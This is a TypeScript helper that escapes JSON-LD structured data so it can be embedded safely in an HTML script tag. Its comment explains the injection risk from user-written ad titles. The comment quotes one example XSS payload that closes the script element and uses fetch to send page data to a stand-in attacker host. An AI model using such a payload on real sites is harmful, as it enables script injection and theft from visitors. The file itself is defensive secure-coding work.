/**
 * Serialise structured data for a `<script type="application/ld+json">` body.
 *
 * `JSON.stringify` alone is **not** safe to interpolate into HTML. It escapes
 * quotes and backslashes but leaves `<` and `/` exactly as they are, so a
 * listing titled
 *
 *     </script><img src=x onerror=fetch('//evil.dz?c='+document.title)>
 *
 * closes the script element and everything after it is parsed as markup. The
 * title and description of an ad are written by anyone with an account, and
 * since a clean ad now publishes itself no human reads them first — this is the
 * shortest path from "signed up" to "running script on every visitor's page,
 * including a moderator's".
 *
 * Escaping the four characters that can end an element (and the two line
 * separators that break inline scripts in older parsers) as JSON `\uXXXX`
 * escapes keeps the payload valid JSON — the browser decodes it back to the
 * original string — while making it impossible for it to leave the string.
 */
export function jsonLdScript(data: unknown): string {
  return JSON.stringify(data)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}
